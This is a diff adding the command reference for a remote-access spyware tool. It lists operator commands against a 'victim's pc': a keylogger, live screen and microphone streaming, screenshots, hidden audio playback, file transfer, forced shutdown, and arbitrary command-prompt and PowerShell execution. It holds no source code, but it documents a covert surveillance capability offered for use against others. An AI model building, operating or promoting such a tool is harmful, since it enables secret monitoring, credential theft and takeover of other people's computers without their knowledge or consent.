@@ -1,0 +1,46 @@
+------------------------------------------------------------
+-----------------  Spyware  --------------------------------
+------------------------------------------------------------
+Created By : Muhammad Jamshaid Ghaffar
+
+
+1) General Commands
+	Command			Description
+	------------			-----------
+	cd              			change directory
+	clear					Clear the output screen
+	help					show help
+	command -h			Show detailed help for specific command
+	dir					show all contents of current directory
+	cmd.exe /c "command"	Executes command prompt commands
+	show message "message"		Displays message dialog on victim's pc
+	
+2) System Commands
+	Command				Description
+	------------				-----------
+	play audio				Plays audio file hiddenly on victim pc
+	stop audio				Stops audio file
+	Stop-Computer -Force		Shutdown computer forcefully
+	Stop-Computer -NoForce 	Inititates a regular shutdown
+	Restart-Computer -Force	Restart Computer Forcefully
+	Restart-Computer -NoWait	Inititates a regular restart
+
+3) File Commands
+	Command			Description
+	-------				-----------
+	download			download file
+	upload				upload file
+
+4) Spying Commands
+	Command			Description
+	------------			-----------
+	screenshot			Take screenshot of entire screen
+	keylogger start		Starts the keylogger
+	keylogger stop		Stops the keylogger
+	screenshare start		Starts a live screen stream of victim pc
+	screenshare stop		Stops live screen stream
+	mic_stream start		Starts live mic stream of victim pc
+	mic_stream stop		Stops live mic Stream of victim pc
+
+5) Remaining Commads
+	All powershell commands which don't require administrator access can be executed
